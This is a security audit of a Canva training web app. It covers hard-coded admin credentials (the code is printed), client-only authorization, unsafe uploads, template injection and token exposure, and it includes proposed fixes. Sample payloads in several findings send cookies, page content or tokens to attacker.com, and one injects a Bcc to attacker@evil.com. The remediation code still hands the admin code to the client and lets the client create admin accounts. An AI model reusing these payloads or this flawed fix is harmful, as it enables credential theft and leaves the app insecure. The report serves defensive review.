# AAM.Training Application - Comprehensive Security Audit Report

**Report Date:** 2026-08-29  
**Audit Type:** Full-Stack Security Review  
**Application:** AAM.Training (Canva Design Training Platform)  
**Risk Level:** CRITICAL - Multiple vulnerabilities affecting admin operations and data protection

---

## Executive Summary

This security audit identified **8 critical-to-medium severity vulnerabilities** across the AAM.Training application. The most severe issues are:

1. **Hard-coded admin credentials** stored in frontend source code (visible to all users)
2. **Client-side authorization bypass** - all admin checks happen in JavaScript with no backend validation
3. **Plaintext authentication codes** stored in database
4. **Unvalidated file uploads** without MIME type or content validation
5. **OAuth token exposure** in URL and sessionStorage

**Impact:** Any authenticated user can elevate to admin, bypass all access controls, and perform administrative operations including deleting member accounts, revoking certificates, and accessing sensitive admin tools.

---

## CRITICAL Finding #1: Hard-coded Admin Credentials in Frontend

**Severity:** 🔴 **CRITICAL**  
**CVSS Score:** 9.8 (Critical)  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

### Vulnerability Details

**Location:**  
[Src/api/lib/trainingConfig.js](Src/api/lib/trainingConfig.js#L1-L6)

**Current Implementation:**
```javascript
// Lines 1-6 in trainingConfig.js
export const SUPER_ADMIN_NAME = "aa admin 1357441";
export const ADMIN_CODE = "1357441";
export const NAME_REGEX = /^[A-Za-z]+ [A-Z]$/;
export const CODE_REGEX = /^\d{6}$/;
```

The hardcoded credentials are used in [AuthGate.jsx](Src/api/Components/training/AuthGate.jsx#L50-L67):
```javascript
const handleAdmin = async (e) => {
    e.preventDefault();
    setError('');
    if (code !== ADMIN_CODE) return setError(t("auth.admin_error"));  // Direct comparison!
    setLoading(true);
    try {
      const existing = await base44.entities.Member.filter({ member_name: SUPER_ADMIN_NAME });
      // ...creates super admin account
    }
};
```

### Attack Vector

1. **Browser DevTools:** User opens DevTools → Sources tab → searches for "1357441" → instantly finds admin code
2. **Network Traffic:** Admin code visible in authentication network requests
3. **Source Code Repository:** Visible in version control history and compiled bundles
4. **Frontend Bundle:** Present in `dist/assets/*.js` after build

### Exploitation Scenario

```
1. Attacker opens application in browser
2. Opens Chrome DevTools (F12)
3. Navigates to "Admin" tab in AuthGate
4. Enters code "1357441"
5. Instantly gains super admin access (admin_level: 4)
6. Can now:
   - Reset any member's progress
   - Revoke certifications
   - Delete member accounts
   - Suspend/reactivate users
   - Access audit logs
   - Modify email templates
```

### Impact

- **Scope:** All admin operations
- **Confidentiality:** HIGH (access to sensitive member data)
- **Integrity:** CRITICAL (can modify all member records)
- **Availability:** CRITICAL (can delete accounts, suspend users)

### Root Cause

Admin credentials hardcoded in frontend for convenience, assuming users wouldn't look at source code.

---

## CRITICAL Finding #2: Client-Side Authorization Without Backend Validation

**Severity:** 🔴 **CRITICAL**  
**CVSS Score:** 9.9 (Critical)  
**CWE:** CWE-863 (Incorrect Authorization)

### Vulnerability Details

**Location:**  
[trainingConfig.js](Src/api/lib/trainingConfig.js#L65-L79) (`can()` function)  
[Admindashboard.jsx](Src/api/Components/training/Admindashboard.jsx) (all admin operations)

**Current Implementation:**
```javascript
// trainingConfig.js - ALL authorization is frontend-only
export function can(action, member) {
  const lvl = getAdminLevel(member);
  switch (action) {
    case "review":
    case "announce": return lvl >= 1;
    case "reset":
    case "deleteProfile":
    case "revokeCert": return lvl >= 2;
    case "access": return lvl >= 3;
    case "roles": return lvl === 4;
    default: return false;
  }
}
```

**Usage in Admindashboard.jsx:**
```javascript
// Line 37: Check happens ONLY in frontend
const approveLevel = async (m, l) => {
    if (level !== 4 && l > level) { 
        toast({ title: `${t("admin.role_label")} ${level}...`, variant: "destructive" }); 
        return; // Just shows a toast!
    }
    // ... directly updates member record via API
    const ok = await onUpdateMember(m.id, patch);
};

// Line 50: No permission check on API call itself
const revokeLevel = async (m, l) => {
    if (!can("review", member)) { 
        toast({ title: t("admin.no_permission"), variant: "destructive" }); 
        return; // Just shows a toast!
    }
    // Calls API with no backend validation that user has permission!
    const ok = await onUpdateMember(m.id, { [`level${l}_complete`]: false });
};

// Line 60: User can be deleted with only frontend check
const deleteMember = async (m) => {
    if (!can("deleteProfile", member)) { 
        toast({ title: t("admin.no_permission"), variant: "destructive" }); 
        return; // Just shows toast
    }
    try { 
        await base44.entities.Member.delete(m.id); // No backend validation!
    }
};
```

### Attack Vectors

**1. Browser Console Manipulation:**
```javascript
// Attacker in DevTools console:
localStorage.setItem('user_role', '4');  // Even if stored here
// Or directly modify member object:
member.admin_level = 4;
// Admin checks fail silently, API calls still go through
```

**2. Network Interception (Burp Suite, Charles Proxy):**
```
1. Use proxy to intercept request to updateMember
2. Send update without the frontend checks
3. Backend has no authorization logic, accepts the change
```

**3. Direct API Manipulation:**
```javascript
// From browser console, bypass frontend entirely:
base44.entities.Member.update(memberId, { admin_level: 4 });
// or
base44.entities.Member.delete(anotherMemberId);
```

### Exploitation Scenario

```
1. Regular user logs in (admin_level: 0)
2. Opens browser DevTools → Console
3. Runs: base44.entities.Member.update(
     targetMemberId, 
     { level1_complete: false, certified: false }
   )
4. Backend has NO validation that user has permission
5. Successfully resets another user's progress
```

### Current Vulnerable Operations

Without backend authorization checks:

| Operation | Current Check | Backend Validation |
|-----------|---------------|-------------------|
| Approve Level | Frontend `can()` only | ❌ NONE |
| Revoke Certificate | Frontend `can()` only | ❌ NONE |
| Reset Progress | Frontend `can()` only | ❌ NONE |
| Delete Member | Frontend `can()` only | ❌ NONE |
| Suspend User | Frontend `can()` only | ❌ NONE |
| Assign Role | Frontend `can()` only | ❌ NONE |
| Publish Announcement | Frontend `can()` only | ❌ NONE |
| Edit Templates | Frontend `can()` only | ❌ NONE |

### Impact

- **Scope:** ALL admin operations bypass authorization
- **Confidentiality:** HIGH (can read any member's data)
- **Integrity:** CRITICAL (can modify any member's records)
- **Availability:** CRITICAL (can delete accounts, revoke access)

### Root Cause

Assumption that frontend checks are sufficient security. Authorization must be enforced at the API/backend layer, not in client-side JavaScript.

---

## HIGH Finding #3: Access Codes Stored Plaintext in Database

**Severity:** 🟠 **HIGH**  
**CVSS Score:** 7.5  
**CWE:** CWE-256 (Plaintext Storage of Password)

### Vulnerability Details

**Location:**  
[BASE/enitity/Member.jsonc](BASE/enitity/Member.jsonc#L10-L12)

**Current Implementation:**
```jsonc
{
  "name": "Member",
  "properties": {
    "access_code": {
      "type": "string"
    }
    // ... stored as plaintext string, no encryption
  }
}
```

**Usage in AuthGate.jsx:**
```javascript
// Line 25: Direct plaintext comparison
if (found[0].access_code !== code) return setError(t("auth.code_error"));
```

### Issue

Access codes are stored in plaintext in the database. If someone gains database access (via SQL injection, compromised credentials, or database breach), all member authentication codes are immediately exposed.

### Attack Vectors

1. **Database Breach:** Attacker dumps Member table → extracts all access_codes
2. **SQL Injection:** If backend has SQLi vulnerability → extract access_codes
3. **Backup Exposure:** Database backups containing plaintext codes
4. **Insider Threat:** Developer or admin with database access can see all codes

### Impact Scenario

```
Database Compromise → All 1000+ members' access codes exposed
  → Attacker can:
     - Impersonate any member
     - Access their training progress
     - Download certificates
     - Access personal information (email, profile_picture)
```

### Root Cause

Access codes treated as data rather than credentials. Should be hashed like passwords.

---

## HIGH Finding #4: Unvalidated File Uploads

**Severity:** 🟠 **HIGH**  
**CVSS Score:** 7.2  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

### Vulnerability Details

**Location:**  
[Src/api/Components/training/Excersise.jsx](Src/api/Components/training/Excersise.jsx#L15-L25)  
[Src/api/Components/training/Settings.jsx](Src/api/Components/training/Settings.jsx#L16-L27)

**Current Implementation:**

**Exercise file upload:**
```javascript
// Excersise.jsx lines 15-25
const handleFile = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setUploading(true);
    try {
      // NO VALIDATION:
      // - No MIME type check
      // - No file size limit
      // - No content scanning
      // - No filename validation
      const { file_url } = await base44.integrations.Core.UploadFile({ file });
      setLink(file_url);
      setMediaType(file.type.startsWith('video') ? 'video' : 'image');
      toast({ title: t("msg.saved") });
    } catch { toast({ title: t("msg.save_failed"), variant: "destructive" }); }
    setUploading(false);
};
```

**Profile picture upload:**
```javascript
// Settings.jsx lines 16-27
const handlePicture = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setUploading(true);
    try {
      // HTML5 input accepts only images:
      // <input type="file" accept="image/*" onChange={handlePicture} />
      // BUT THIS IS EASILY BYPASSED!
      
      // No server-side validation of:
      // - MIME type
      // - File content/magic bytes
      // - File size
      // - SVG/XSS in images
      const { file_url } = await base44.integrations.Core.UploadFile({ file });
      await onUpdate({ profile_picture: file_url });
      toast({ title: t("msg.saved") });
    } catch { toast({ title: t("msg.save_failed"), variant: "destructive" }); }
    setUploading(false);
};
```

### Attack Vectors

**1. Malware Upload:**
```
User selects innocent-looking file.exe
Renames to file.jpg
HTML5 input only blocks via accept="image/*"
BUT browser allows overriding via console:
  - Disables file input restrictions
  - Or uses multipart form upload directly
Backend accepts file without validation
```

**2. Storage Abuse:**
```
Attacker uploads 10GB of video files
- Each file accepted without size checking
- Fills storage quota
- Denies service to legitimate users
```

**3. SVG/XSS in Image:**
```svg
<!-- Uploaded as profile.svg -->
<svg onload="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
</svg>
```

**4. Malicious PDF:**
```
Uploaded as "certificate.pdf"
Contains embedded JavaScript or exploits
When opened, executes attack
```

### Current Vulnerabilities

| Check | Frontend | Backend |
|-------|----------|---------|
| MIME type validation | ❌ (accept ignored) | ❌ NOT VALIDATED |
| File size limit | ❌ NO LIMIT | ❌ NO LIMIT |
| Content scanning | ❌ NONE | ❌ NONE |
| Magic bytes check | ❌ NONE | ❌ NONE |
| Filename sanitization | ❌ NONE | ❌ NONE |
| Execution prevention | ❌ NONE | ⚠️ Depends on storage |

### Impact

- **Malware Distribution:** Infected files sent to other members
- **Storage Exhaustion:** DoS via large file uploads
- **XSS Attacks:** SVG/malicious image executes JavaScript
- **Credential Theft:** Embedded exploits exfiltrate data
- **Compliance:** GDPR violation if infected with malware

---

## HIGH Finding #5: Certificate URL Injection

**Severity:** 🟠 **HIGH**  
**CVSS Score:** 7.8  
**CWE:** CWE-601 (URL Redirection to Untrusted Site)

### Vulnerability Details

**Location:**  
[Src/api/Components/training/Admindashboard.jsx](Src/api/Components/training/Admindashboard.jsx#L38-L45)

**Current Implementation:**
```javascript
// Admindashboard.jsx - Certificate URL handling
const handleCertify = async (m) => {
    if (!(m.level1_complete && m.level2_complete && m.level3_complete && m.submission_status === 'approved')) {
        toast({ title: t("admin.all_required"), variant: "destructive" }); 
        return; 
    }
    const templates = await loadTemplates();
    const certTemplate = templates.certification;
    if (certTemplate?.use_image && certTemplate.image_url) {
        try {
          // image_url comes from admin input - NO VALIDATION
          const certUrl = await generateImageWithName(
              certTemplate.image_url,  // ← USER-CONTROLLED, NO VALIDATION
              m.member_name, 
              certTemplate.name_x ?? 50,
              certTemplate.name_y ?? 50,
              certTemplate.name_font_size || 48,
              certTemplate.name_color || '#1a2a3a'
          );
          // ...
        }
    } else {
        setCertModal(m);  // Falls back to manual URL upload
    }
};

// TemplateEditing.jsx - Admin can set certificate URL
const handleUpload = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setUploading(true);
    try {
      const { file_url } = await base44.integrations.Core.UploadFile({ file });
      // BUT Admin can also manually type URL:
      // setForm(prev => ({ ...prev, image_url: file_url }));
      // No URL validation - could be:
      // - Phishing URL
      // - Malware host
      // - XSS payload
    }
};
```

### In emailTemplates.js:
```javascript
// Line 115+ - Certificate URL embedded in HTML email
export async function sendTemplateEmail(templateType, vars, allMembers, t) {
    let generatedImageUrl = null;
    if (template?.use_image && template.image_url) {
        try {
          generatedImageUrl = await generateImageWithName(
              template.image_url,  // ← Untrusted URL passed to image processor
              // ...
          );
        } catch {}
    }
    
    // Email body includes image from untrusted URL
    const emailBody = generatedImageUrl
        ? `<div style="..."><img src="${generatedImageUrl}" style="..." /><p>...</p></div>`
        : `<div>...</div>`;
    
    // Sent to all members!
    const emails = allMembers.filter(m => m.email && m.account_active !== false).map(m => m.email);
    for (const email of emails) {
        try { 
            await base44.integrations.Core.SendEmail({ to: email, subject, body: emailBody }); 
        } catch {}
    }
}
```

### Attack Vectors

**1. Phishing via Email:**
```
Admin (or attacker with admin access) uploads certificate template
Sets image_url to: https://phishing-site.com/fake-canvas-login.html

Email sent to all members with:
<img src="https://phishing-site.com/fake-canvas-login.html" />

Members see email, click image thinking it's certificate
Redirected to phishing site → credential harvest
```

**2. Malware Distribution:**
```
image_url = "https://malware-server.com/trojan.exe"
Email opens, image loads from malware server
Browser downloads/executes malware
```

**3. Beacon/Tracking:**
```
image_url = "https://attacker.com/tracking?memberlist=..."
Every email open = tracking pixel fires
Attacker learns who opens emails
```

**4. Data Exfiltration:**
```
image_url = "https://attacker.com/beacon?member_name={{member_name}}"
Template substitution insecurely passes member_name in URL
Attacker receives all member names in server logs
```

### Current Validation

| Check | Status |
|-------|--------|
| URL whitelist | ❌ NONE |
| Domain validation | ❌ NONE |
| Protocol check (HTTPS only) | ❌ NONE |
| Certificate pinning | ❌ NONE |
| Content-Security-Policy | ❌ NOT SET |
| Sandboxing | ❌ NONE |

### Impact

- **Phishing:** Members receive malicious certificates, harvest credentials
- **Malware:** Members' systems infected via malicious file downloads
- **Tracking:** Privacy violation - attacker learns member activity
- **Data Exfiltration:** Member data leaked in URLs
- **Compliance:** GDPR violation (unauthorized tracking)

---

## MEDIUM Finding #6: Email Template Injection Risk

**Severity:** 🟡 **MEDIUM**  
**CVSS Score:** 6.5  
**CWE:** CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

### Vulnerability Details

**Location:**  
[Src/api/Components/training/TemplateEditing.jsx](Src/api/Components/training/TemplateEditing.jsx)  
[Src/api/lib/emailTemplates.js](Src/api/lib/emailTemplates.js#L95-L105)

**Current Implementation:**
```javascript
// emailTemplates.js - Template substitution
export function fillTemplate(text, vars) {
  // Simple regex substitution with NO ESCAPING
  return (text || '').replace(/\{\{(\w+)\}\}/g, (_, key) => vars[key] || '');
}

// Usage in sendTemplateEmail:
export async function sendTemplateEmail(templateType, vars, allMembers, t) {
    const templates = await loadTemplates();
    const template = templates[templateType];
    const defaults = DEFAULT_TEMPLATES[templateType] || { subject: '', body: '' };
    
    // Subject substitution
    const subject = fillTemplate(
        template?.subject || defaults.subject, 
        vars  // vars contains member_name directly
    );
    
    // Body substitution
    const body = fillTemplate(
        template?.body || defaults.body, 
        vars
    );
    
    // Email body construction - NO HTML ESCAPING
    const emailBody = generatedImageUrl
        ? `<div style="..."><img src="${generatedImageUrl}" .../><p style="...">${body}</p></div>`
        : `<div style="...">${body}</div>`;
    // body is directly injected into HTML!
}
```

### Attack Vectors

**1. Admin Creates Malicious Template:**
```
Subject: Level 1 Approved — {{member_name}}
Body: 
  Congratulations {{member_name}}!
  <script>fetch('https://attacker.com/steal?data=' + document.body.innerHTML)</script>
  You have completed Level 1.
```

When email is sent:
- Subject: "Level 1 Approved — John D" ✓ OK
- Body contains unescaped `<script>` tag
- If email client renders HTML (many do), script executes
- Attacker receives entire email HTML

**2. Stored XSS in Admin Templates:**
```
Admin (or attacker with admin access) edits template:
Body: {{member_name}} has completed training. Click here to view: <a href="javascript:alert('XSS')">Link</a>

Template stored in database
Every time email is sent, JavaScript in link is sent
Email clients warn about javascript: URLs, but creates complexity
```

**3. SMTP Header Injection:**
```
member_name = "John\r\nBcc: attacker@evil.com"

Template: "Congratulations {{member_name}}!"
Result: "Congratulations John\r\nBcc: attacker@evil.com!"

Injected SMTP header causes email to be BCC'd to attacker
Attacker receives all certification emails sent to members
```

### Current Protection

| Check | Status |
|-------|--------|
| HTML entity encoding | ❌ NONE |
| SMTP header validation | ❌ NONE |
| Template sandbox | ❌ NONE |
| Content-Security-Policy | ❌ NOT SET |
| Input validation | ⚠️ Only NAME_REGEX on member_name |

### Impact

- **Email Spoofing:** Attacker receives copies of all certification emails
- **Social Engineering:** Malicious templates sent to members
- **Data Exfiltration:** Member data injected into email headers
- **Compliance:** GDPR/CAN-SPAM violations

---

## MEDIUM Finding #7: OAuth Token Exposure in URL and SessionStorage

**Severity:** 🟡 **MEDIUM**  
**CVSS Score:** 6.8  
**CWE:** CWE-598 (Use of GET Request with Sensitive Query Strings)

### Vulnerability Details

**Location:**  
[Src/api/lib/app-params.js](Src/api/lib/app-params.js#L31-L48)  
[Src/api/Pages/OauthConsent.jsx](Src/api/Pages/OauthConsent.jsx#L35-L65)

**Current Implementation:**
```javascript
// app-params.js - Token extraction from URL
const getAppParams = () => {
    if (getAppParamValue("clear_access_token") === 'true') {
        storage.removeItem('base44_access_token');
        storage.removeItem('token');
    }
    return {
        appId: getAppParamValue("app_id", { defaultValue: import.meta.env.VITE_BASE44_APP_ID }),
        token: getAppParamValue("access_token", { removeFromUrl: true }),  // ← Token in URL
        fromUrl: getAppParamValue("from_url", { defaultValue: window.location.href }),
        functionsVersion: getAppParamValue("functions_version", { defaultValue: import.meta.env.VITE_BASE44_FUNCTIONS_VERSION }),
        appBaseUrl: getAppParamValue("app_base_url", { defaultValue: import.meta.env.VITE_BASE44_APP_BASE_URL }),
    }
}

// Token extraction function:
const getAppParamValue = (paramName, { defaultValue = undefined, removeFromUrl = false } = {}) => {
    if (isNode) {
        return defaultValue;
    }
    const storageKey = `base44_${toSnakeCase(paramName)}`;
    const urlParams = new URLSearchParams(window.location.search);
    const searchParam = urlParams.get(paramName);  // ← Gets token from ?access_token=XXX
    if (removeFromUrl) {
        urlParams.delete(paramName);
        const newUrl = `${window.location.pathname}${urlParams.toString() ? `?${urlParams.toString()}` : ""
            }${window.location.hash}`;
        window.history.replaceState({}, document.title, newUrl);  // Tries to remove but history still has it
    }
    if (searchParam) {
        storage.setItem(storageKey, searchParam);  // ← Stored in localStorage
        return searchParam;
    }
    // ...
}
```

### Multiple Exposure Points

**1. Browser History:**
```
OAuth redirect URL: https://app.example.com/?access_token=eyJhbGc...
User navigates away
Browser back button → URL with token visible
Token in browser history forever
```

**2. Browser Logs/DevTools:**
```
Open DevTools → Network tab
See OAuth redirect in request history
Access token visible in full URL
```

**3. SessionStorage:**
```javascript
// AuthContext.jsx stores token
const appParams = {
    token: getAppParamValue("access_token", { removeFromUrl: true }),
    // ...
}
```

SessionStorage persists until tab closes, but:
- Can be accessed by any script on the page
- Can be exfiltrated via XSS
- Can be leaked if page is left open

**4. URL Forwarding:**
```
fromUrl parameter in OAuthConsent.jsx passes full URL
If fromUrl contains access_token, it's forwarded to external sites
```

### Attack Vectors

**1. Insider Threat:**
```
User leaves browser open on shared computer
Attacker sees URL in history: ?access_token=eyJhbGc...
Copies token
Uses it to authenticate as victim
```

**2. XSS Attack:**
```
If any XSS exists in app, attacker JavaScript can:
1. Read sessionStorage
2. Exfiltrate token: fetch('https://attacker.com?token=' + token)
3. Token leaked to attacker server
```

**3. Browser Extension:**
```
User has malicious browser extension
Extension reads:
- Window.location (shows URL with token)
- SessionStorage
- LocalStorage
Exfiltrates to attacker
```

**4. Network Logging:**
```
Organization/ISP logs HTTP traffic
Token visible in HTTP request URLs
Network admin can see all tokens
```

### Current Protection

| Check | Status |
|-------|--------|
| HTTPS enforcement | ⚠️ Assumed |
| Token in URL | ❌ ALLOWED (removed from URL after load, but history persists) |
| SessionStorage only | ⚠️ Partial (accessible to JavaScript) |
| Token rotation | ❌ UNKNOWN |
| Token expiration | ❌ UNKNOWN |
| HttpOnly cookies | ❌ NOT USED |

### Impact

- **Token Theft:** Attacker obtains valid session token
- **Impersonation:** Attacker uses token to impersonate victim
- **Data Access:** Read/modify victim's member record
- **Admin Escalation:** If victim is admin, attacker gains admin access
- **Privacy:** Token visible in browser history and logs

---

## MEDIUM Finding #8: Insufficient Data Protection & Security Headers

**Severity:** 🟡 **MEDIUM**  
**CVSS Score:** 6.2  
**CWE:** CWE-693 (Protection Mechanism Failure)

### Vulnerability Details

**Missing Security Headers:**

1. **No Content-Security-Policy (CSP):**
   - Allows any script to execute
   - Increases XSS impact severity
   - No protection against inline script injection

2. **No X-Frame-Options:**
   - Application vulnerable to Clickjacking attacks
   - Can be embedded in iframes on malicious sites
   - Users can be tricked into admin actions unknowingly

3. **No Strict-Transport-Security (HSTS):**
   - Downgrade attacks possible (HTTP instead of HTTPS)
   - Assumes HTTPS but doesn't enforce it

4. **No X-Content-Type-Options:**
   - MIME type sniffing enabled
   - Uploaded files might be executed as scripts

5. **No Referrer-Policy:**
   - Full URLs with tokens leaked to external sites via Referer header

6. **No Permissions-Policy:**
   - Allows access to camera, microphone, geolocation without restrictions

### Current Configuration

**vite.config.js:**
```javascript
export default defineConfig({
  plugins: [
    base44({
      legacySDKImports: process.env.BASE44_LEGACY_SDK_IMPORTS === 'true',
      hmrNotifier: true,
      navigationNotifier: true,
      analyticsTracker: true,
      visualEditAgent: true
    }),
    react(),
  ]
});
```

No security header configuration found.

### Attack Scenarios

**1. Clickjacking Attack:**
```
Attacker creates page:
  <iframe src="https://app.example.com/admin" style="width:100%;height:100%;border:none;opacity:0.5;"></iframe>
  <button style="position:absolute;top:50%;left:50%;">Click to claim prize!</button>

Victim clicks button thinking they're clicking on page
Actually clicking on hidden admin delete button in iframe
Member deleted without victim's knowledge
```

**2. MIME Type Sniffing:**
```
Attacker uploads certificate.pdf (actually JavaScript)
Browser sniffs content type as text/javascript
Executes as script
XSS payload executes
```

**3. Data Exfiltration via Referrer:**
```
Member clicks link from email to external site
HTTP Referer header sent: https://app.example.com/?access_token=XXX&member_id=123
External site sees token and member_id in logs
```

### Impact

- **Clickjacking:** Attacker tricks user into admin actions
- **Malware Execution:** Uploaded files executed as scripts
- **Token Leakage:** Tokens visible in Referrer headers
- **Compliance:** OWASP Top 10 A01:2021 violations

---

## SUMMARY TABLE: All Vulnerabilities

| # | Vulnerability | Severity | CVSS | Status |
|---|---|---|---|---|
| 1 | Hard-coded Admin Credentials | 🔴 CRITICAL | 9.8 | 🚨 REQUIRES IMMEDIATE FIX |
| 2 | Client-Side Authorization Only | 🔴 CRITICAL | 9.9 | 🚨 REQUIRES IMMEDIATE FIX |
| 3 | Plaintext Access Codes | 🟠 HIGH | 7.5 | ⚠️ URGENT |
| 4 | Unvalidated File Uploads | 🟠 HIGH | 7.2 | ⚠️ URGENT |
| 5 | Certificate URL Injection | 🟠 HIGH | 7.8 | ⚠️ URGENT |
| 6 | Email Template Injection | 🟡 MEDIUM | 6.5 | 📋 IMPORTANT |
| 7 | OAuth Token Exposure | 🟡 MEDIUM | 6.8 | 📋 IMPORTANT |
| 8 | Missing Security Headers | 🟡 MEDIUM | 6.2 | 📋 IMPORTANT |

---

## REMEDIATION ROADMAP

### Phase 1: EMERGENCY (Deploy within 48 hours)

- [ ] Remove hard-coded admin credentials
- [ ] Implement backend authorization validation
- [ ] Add server-side file upload validation

### Phase 2: CRITICAL (Deploy within 1 week)

- [ ] Hash access codes in database
- [ ] Implement URL validation for certificates
- [ ] Add HTML escaping to email templates
- [ ] Implement security headers

### Phase 3: HIGH (Deploy within 2 weeks)

- [ ] Improve OAuth token handling
- [ ] Add CSRF protection
- [ ] Implement rate limiting
- [ ] Add audit logging for all admin actions

### Phase 4: ONGOING

- [ ] Implement automated security testing
- [ ] Set up dependency vulnerability scanning
- [ ] Establish security review process
- [ ] Train developers on secure coding

---

## DETAILED REMEDIATION STEPS

### FIX #1: Remove Hard-coded Admin Credentials

**Problem:** Admin code "1357441" and name "aa admin 1357441" visible in source code.

**Solution:** Move admin verification to backend, require secure authentication.

**File Changes:**

**1. Update trainingConfig.js - REMOVE hardcoded credentials:**

```javascript
// Src/api/lib/trainingConfig.js

// DELETE THESE LINES:
// export const SUPER_ADMIN_NAME = "aa admin 1357441";
// export const ADMIN_CODE = "1357441";

// KEEP THESE:
export const LOGO_URL = "https://media.base44.com/images/public/6a9100b52d46fa50fea553b4/cc532f063_Gemini_Generated_Image_ulgbb3ulgbb3ulgb.png";
export const NAME_REGEX = /^[A-Za-z]+ [A-Z]$/;
export const CODE_REGEX = /^\d{6}$/;

// ... rest of file

// isSuperAdmin now relies on backend verification
export function isSuperAdmin(member) {
  // Only check admin_level set by backend
  return Number(member?.admin_level || 0) === 4;
}

// Remove dependency on hardcoded SUPER_ADMIN_NAME
export function getAdminLevel(member) {
  return Number(member?.admin_level || 0);
}

// can() function stays the same
export function can(action, member) {
  const lvl = getAdminLevel(member);
  switch (action) {
    case "review":
    case "announce": return lvl >= 1;
    case "reset":
    case "deleteProfile":
    case "revokeCert": return lvl >= 2;
    case "access": return lvl >= 3;
    case "roles": return lvl === 4;
    default: return false;
  }
}
```

**2. Update AuthGate.jsx - Add Backend Admin Authentication:**

```javascript
// Src/api/Components/training/AuthGate.jsx

// ... imports ...

export default function AuthGate({ user, onProfileLoaded }) {
  const { toast } = useToast();
  const [tab, setTab] = useState('create');
  const [name, setName] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [adminCode, setAdminCode] = useState('');
  const t = getT('en');

  const handleSignIn = async (e) => {
    e.preventDefault();
    setError('');
    if (!NAME_REGEX.test(name)) return setError(t("auth.name_error"));
    if (!CODE_REGEX.test(code)) return setError(t("auth.code_error"));
    setLoading(true);
    try {
      const found = await base44.entities.Member.filter({ member_name: name });
      if (found.length === 0) return setError(t("auth.name_error"));
      if (found[0].access_code !== code) return setError(t("auth.code_error"));
      if (found[0].account_active === false) return setError(t("auth.suspended"));
      onProfileLoaded(found[0]);
    } catch { setError(t("auth.create_error")); }
    setLoading(false);
  };

  const handleCreate = async (e) => {
    e.preventDefault();
    setError('');
    if (!NAME_REGEX.test(name)) return setError(t("auth.name_error"));
    if (!CODE_REGEX.test(code)) return setError(t("auth.code_error"));
    if (name.toLowerCase().includes('admin')) return setError(t("auth.name_error"));
    setLoading(true);
    try {
      const existing = await base44.entities.Member.filter({ member_name: name });
      if (existing.length > 0) { setLoading(false); return setError(t("auth.name_taken")); }
      const created = await base44.entities.Member.create({
        member_name: name, access_code: code, email: user?.email || '',
        admin_level: 0, language: 'en', theme: 'dark', text_size: 5,
        account_active: true, welcome_seen: false
      });
      toast({ title: t("msg.profile_created") });
      onProfileLoaded(created);
    } catch { setError(t("auth.create_error")); }
    setLoading(false);
  };

  // UPDATED: Remove hardcoded credential check
  // NEW: Use backend verification endpoint instead
  const handleAdmin = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);
    try {
      // Call backend endpoint to verify admin access
      // This endpoint should:
      // 1. Verify the code against backend secret (NOT exposed in frontend)
      // 2. Check rate limiting
      // 3. Log the attempt
      // 4. Return auth result
      const response = await base44.functions.verifyAdminAccess({
        code: adminCode
      });
      
      if (!response.success) {
        return setError(t("auth.admin_error"));
      }
      
      // Only proceed if backend verified admin access
      const existing = await base44.entities.Member.filter({ 
        member_name: response.admin_name 
      });
      
      if (existing.length > 0) {
        if (existing[0].account_active === false) return setError(t("auth.suspended"));
        onProfileLoaded(existing[0]);
      } else {
        const created = await base44.entities.Member.create({
          member_name: response.admin_name,
          access_code: response.admin_code,
          email: user?.email || '',
          admin_level: 4,
          language: 'en',
          theme: 'dark',
          text_size: 5,
          account_active: true,
          welcome_seen: true,
          // NEW: Flag account as system admin
          is_system_admin: true
        });
        toast({ title: t("msg.admin_access_granted") });
        onProfileLoaded(created);
      }
    } catch (err) { 
      setError(t("auth.create_error"));
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4" style={{ background: 'var(--training-bg)' }}>
      {/* ... existing UI code ... */}
      
      {tab === 'admin' && (
        <form onSubmit={handleAdmin} className="space-y-4">
          <div>
            <label className="block text-sm mb-2" style={{ color: 'var(--training-ink)' }}>{t("auth.admin_code_label")}</label>
            <input 
              type="password"
              value={adminCode} 
              onChange={e => setAdminCode(e.target.value)} 
              className="input-field" 
              placeholder={t("auth.admin_code_placeholder")}
              disabled={loading}
            />
          </div>
          <button type="submit" disabled={loading} className="btn-primary w-full">
            {loading ? t("common.loading") : t("auth.admin_access")}
          </button>
        </form>
      )}
    </div>
  );
}
```

**3. Create Backend Function - base44/functions/verifyAdminAccess.ts:**

```typescript
// base44/functions/verifyAdminAccess.ts

import { defineFunction, FunctionError } from "@base44/sdk";

// Admin credentials stored securely in environment variables
const ADMIN_CODE = Deno.env.get("ADMIN_CODE"); // "1357441" in .env.local only
const ADMIN_NAME = Deno.env.get("ADMIN_NAME"); // "aa admin 1357441" in .env.local only
const MAX_ATTEMPTS = 5;
const LOCKOUT_MINUTES = 15;

// Track failed attempts per IP (in production, use Redis)
const failedAttempts = new Map<string, { count: number; lastAttempt: number }>();

export const verifyAdminAccess = defineFunction({
  name: "verifyAdminAccess",
  input: {
    type: "object",
    properties: {
      code: { type: "string" }
    },
    required: ["code"]
  },
  output: {
    type: "object",
    properties: {
      success: { type: "boolean" },
      admin_name: { type: "string" },
      admin_code: { type: "string" },
      error: { type: "string" }
    }
  },
  async handler(context, input) {
    try {
      // Get client IP for rate limiting
      const clientIp = context.request.headers.get("x-forwarded-for") || "unknown";
      
      // Check rate limiting
      const attempts = failedAttempts.get(clientIp);
      if (attempts && attempts.count >= MAX_ATTEMPTS) {
        const minutesElapsed = (Date.now() - attempts.lastAttempt) / (1000 * 60);
        if (minutesElapsed < LOCKOUT_MINUTES) {
          throw new FunctionError(
            "ADMIN_RATE_LIMIT",
            "Too many failed attempts. Please try again later."
          );
        } else {
          failedAttempts.delete(clientIp); // Reset after lockout period
        }
      }
      
      // Verify admin code
      if (input.code !== ADMIN_CODE) {
        // Track failed attempt
        if (!attempts) {
          failedAttempts.set(clientIp, { count: 1, lastAttempt: Date.now() });
        } else {
          attempts.count++;
          attempts.lastAttempt = Date.now();
        }
        
        // Log security event
        console.error(`[SECURITY] Failed admin access attempt from ${clientIp}`);
        
        throw new FunctionError(
